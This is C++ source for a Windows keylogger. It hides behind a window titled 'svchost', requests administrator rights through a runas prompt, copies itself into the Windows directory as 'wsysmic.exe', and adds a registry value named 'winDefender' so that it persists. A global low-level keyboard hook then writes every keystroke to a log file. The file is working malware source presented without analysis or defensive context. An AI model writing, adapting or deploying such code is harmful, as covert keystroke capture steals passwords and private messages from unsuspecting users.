
#include "WinMain.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
BOOL IsRunAsAdmin();
int makeMeAdmin( HWND hWnd );
long createRegistry( LPCTSTR data );

Logger* logger = new Logger(LOG_FILE);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)

{
	HWND hwnd;
	MSG msg;
	WNDCLASSEX wndcls;
	ERROR_SUCCESS;
	const char g_szClassName[] = "michifu";
	char* destination = (char*)malloc(sizeof(char) * MAX_PATH);
	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);

	strcpy(destination, std::getenv("windir") );
	strcat(destination, "\\wsysmic.exe");
	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH );

	wndcls.cbSize = sizeof(WNDCLASSEX);
	wndcls.style = CS_HREDRAW | CS_VREDRAW;
	wndcls.lpfnWndProc = WndProc;
	wndcls.cbClsExtra = 0;
	wndcls.cbWndExtra = 0;
	wndcls.hInstance = hInstance;
	wndcls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndcls.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndcls.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wndcls.lpszClassName = g_szClassName;
	wndcls.lpszMenuName = NULL;
	wndcls.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	( !RegisterClassEx(&wndcls) ) ? logger->write("[ register class success ]\n") : logger->write("[ register class fail ]\n");
	hwnd = CreateWindowEx(NULL,	g_szClassName, "svchost", NULL, 0, 0, 0, 0,	NULL, NULL, hInstance, NULL);

	if (!IsRunAsAdmin()) makeMeAdmin(hwnd);

	( !CopyFile(iam, destination, 0) ) ? logger->write("[ copy success ]\n") : logger->write ("[ copy fail ]\n" );
	(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register success ]\n") : logger->write("[ register fail ]");
    
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	(hhkLowLevelKybd != NULL) ? logger->write("hhkLowLevelKybd hooked !\n") : logger->write("hhkLowLevelKybd failed !\n");

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);
	return msg.wParam;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		switch (p->vkCode)
		{
		case VK_RSHIFT:
			break;
		case VK_SHIFT:
			break;
		case VK_LSHIFT:
			break;
		case VK_CAPITAL:
			break;
		case VK_NUMPAD0:
			logger->write("0");
			break;
		case VK_NUMPAD1:
			logger->write("1");
			break;
		case VK_NUMPAD2:
			logger->write("2");
			break;
		case VK_NUMPAD3:
			logger->write("3");
			break;
		case VK_NUMPAD4:
			logger->write("4");
			break;
		case VK_NUMPAD5:
			logger->write("5");
			break;
		case VK_NUMPAD6:
			logger->write("6");
			break;
		case VK_NUMPAD7:
			logger->write("7");
			break;
		case VK_NUMPAD8:
			logger->write("8");
			break;
		case VK_NUMPAD9:
			logger->write("9");
			break;
		case VK_ADD:
			logger->write("+");
			break;
		case VK_BACK:
			logger->write("[ DEL ]");//borra
			break;
		case VK_DECIMAL:
			logger->write(".");// .
			break;
		case VK_DIVIDE:
			logger->write("/");
			break;
		case VK_ESCAPE:
			//logger->write("[ ESC ]");
			break;
		case VK_TAB:
			logger->write("\t");
			break;
		case VK_MULTIPLY:
			logger->write("*");// *
			break;
		case VK_OEM_1:
			logger->write("[ :; ]");//:; 
			break;
		case VK_OEM_102:
			logger->write("[ <> ]");//<> 
			break;
		case VK_OEM_2:
			logger->write("[ ?/ ]");// ?/ 
			break;
		case VK_OEM_3:
			logger->write("[ ~´ ]");//~`
			break;
		case VK_OEM_4:
			logger->write("[ {[ ]");//{[ 
			break;
		case VK_OEM_5:
			logger->write("[ |\\ ]");// |\ 
			break;
		case VK_OEM_6:
			logger->write("[ }] ]");//}]
			break;
		case VK_OEM_7:
			logger->write("[ \"' ]");// "'
			break;
		case VK_OEM_8:
			logger->write("[ $! ]");// §!
			break;
		case VK_OEM_COMMA:
			logger->write("[ <, ]");//<, 
			break;
		case VK_OEM_MINUS:
			logger->write("[ _- ]");// _- 
			break;
		case VK_OEM_PERIOD:
			logger->write("[ >. ]");// >. 
			break;
		case VK_OEM_PLUS:
			logger->write("[ += ]");// += 
			break;
		case VK_SPACE:
			logger->write(" ");
			break;
		case VK_RETURN:
			logger->write("\n");
			break;
		case VK_DOWN:
			//logger->write("[ DOWN ]");
			break;
		case VK_UP:
			//logger->write("[ UP ]");
			break;
		case VK_LEFT:
			//logger->write("[ LEFT ]");
			break;
		case VK_RIGHT:
			//logger->write("[ RIGHT ]");
			break;
		case VK_LCONTROL:
			//logger->write("[ L_CONTROL ]");
			break;
		case VK_RCONTROL:
			//logger->write("[ R_CONTROL ]");
			break;
		case VK_F1:
			//logger->write("[ F1 ]");
			break;
		case VK_F2:
			//logger->write("[ F2 ]");
			break;
		case VK_F3:
			//logger->write("[ F3 ]");
			break;
		case VK_F4:
			//logger->write("[ F4 ]");
			break;
		case VK_F5:
			//logger->write("[ F5 ]");
			break;
		case VK_F6:
			//logger->write("[ F6 ]");
			break;
		case VK_F7:
			//logger->write("[ F7 ]");
			break;
		case VK_F8:
			//logger->write("[ F8 ]");
			break;
		case VK_F9:
			//logger->write("[ F9 ]");
			break;
		case VK_F10:
			//logger->write("[ F10 ]");
			break;
		case VK_F11:
			//logger->write("[ F11 ]");
			break;
		case VK_F12:
			//logger->write("[ F12 ]");
			break;
		default:
			( GetKeyState(VK_SHIFT) < 0 || (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ) ? logger->write(p->vkCode):logger->write( tolower(p->vkCode) );
			break;
		}
	}
	else if (nCode == HC_ACTION && (wParam == WM_KEYUP|| wParam == WM_SYSKEYUP)) {}
	else {}
	return(CallNextHookEx(NULL, nCode, wParam, lParam));
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
	switch (iMsg)
	{
	case WM_DESTROY:
		logger->write("[ closed ]\n");
		logger->~Logger();
		PostQuitMessage(0);
		return 0;
		break;
	default:
		return DefWindowProc(hwnd, iMsg, wParam, lParam);
	}
}

BOOL IsRunAsAdmin()
{
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;
	// Allocate and initialize a SID of the administrators group.
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
									&NtAuthority,
									2,
									SECURITY_BUILTIN_DOMAIN_RID,
									DOMAIN_ALIAS_RID_ADMINS,
									0, 0, 0, 0, 0, 0,
									&pAdministratorsGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}
	// Determine whether the SID of administrators group is enabled in 
	// the primary access token of the process.
	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (pAdministratorsGroup)
	{
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	// Throw the error if something failed in the function.
	if (ERROR_SUCCESS != dwError) throw dwError;
	return fIsRunAsAdmin;
}

int makeMeAdmin(HWND hwnd) {

	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);

	if (GetModuleFileName(NULL, iam, sizeof(char) * MAX_PATH) )
	{
		// Launch itself as administrator.
		SHELLEXECUTEINFO sei = { sizeof(sei) };
		sei.lpVerb = "runas";
		sei.lpFile = iam;
		sei.hwnd = hwnd;
		sei.nShow = SW_NORMAL;
		if (!ShellExecuteEx(&sei))
		{
			DWORD dwError = GetLastError();
			if (dwError == ERROR_CANCELLED)
			{
				// The user refused the elevation.
				// Do nothing ...
				logger->write("REFUSE ADMIN");
			}
		}
		else
			DestroyWindow(hwnd);  // Quit itself
	}
	return 0;
}

long createRegistry(LPCTSTR data) {

	HKEY hkey;
	DWORD dw;
	long result = RegCreateKeyEx( HKEY_KEYLOGGER,
								TEXT ( HKEY_KEYLOGGER_SUB ),
								0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, &dw);

	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, "winDefender", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
	RegCloseKey(hkey);
	return result;
}